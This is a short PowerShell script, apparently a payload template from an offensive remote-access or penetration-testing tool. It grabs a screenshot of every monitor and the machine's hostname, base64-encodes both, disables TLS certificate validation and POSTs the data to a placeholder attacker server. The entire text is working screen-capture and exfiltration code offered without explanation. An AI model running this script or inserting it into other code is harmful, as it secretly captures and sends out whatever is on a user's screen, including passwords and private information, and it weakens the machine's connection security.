Add-Type -AssemblyName System.Windows.Forms,System.Drawing; 
$bounds = [Drawing.Rectangle]::FromLTRB(([Int32]::MaxValue),([Int32]::MaxValue),([Int32]::MinValue),([Int32]::MinValue)); 
foreach ($screen in [Windows.Forms.Screen]::AllScreens) {if ($screen.Bounds.X -lt $bounds.Left) {$bounds.X = $screen.Bounds.X}; if ($screen.Bounds.Y -lt $bounds.Top) {$bounds.Y = $screen.Bounds.Y}; if ($screen.Bounds.Right -gt $bounds.Right) {$bounds.Width = $screen.Bounds.Right - $bounds.Left}; if ($screen.Bounds.Bottom -gt $bounds.Bottom) {$bounds.Height = $screen.Bounds.Bottom - $bounds.Top}}; $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); $encoder = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatID -eq [Drawing.Imaging.ImageFormat]::Jpeg.Guid }; 
$encoderParams = New-Object Drawing.Imaging.EncoderParameters(1); 
$encoderParams.Param[0] = New-Object Drawing.Imaging.EncoderParameter([Drawing.Imaging.Encoder]::Quality, 25); 
$ms = New-Object IO.MemoryStream; $bmp.Save($ms, $encoder, $encoderParams); 
$screenshot = [Convert]::ToBase64String($ms.ToArray()); 
$graphics.Dispose(); 
$bmp.Dispose();
$URL='SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';
$headers=@{'Proof'='1'};
function Encode64{
param($Text);if($null -eq $Text){return "IA=="}else{$Bytes=[System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);return $EncodedText}
};
$hostname=Encode64(hostname);
$params=@{hostname=$hostname;screenshot=$screenshot};
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
Invoke-WebRequest -Uri $URL -Headers $headers -Method POST -Body $params;
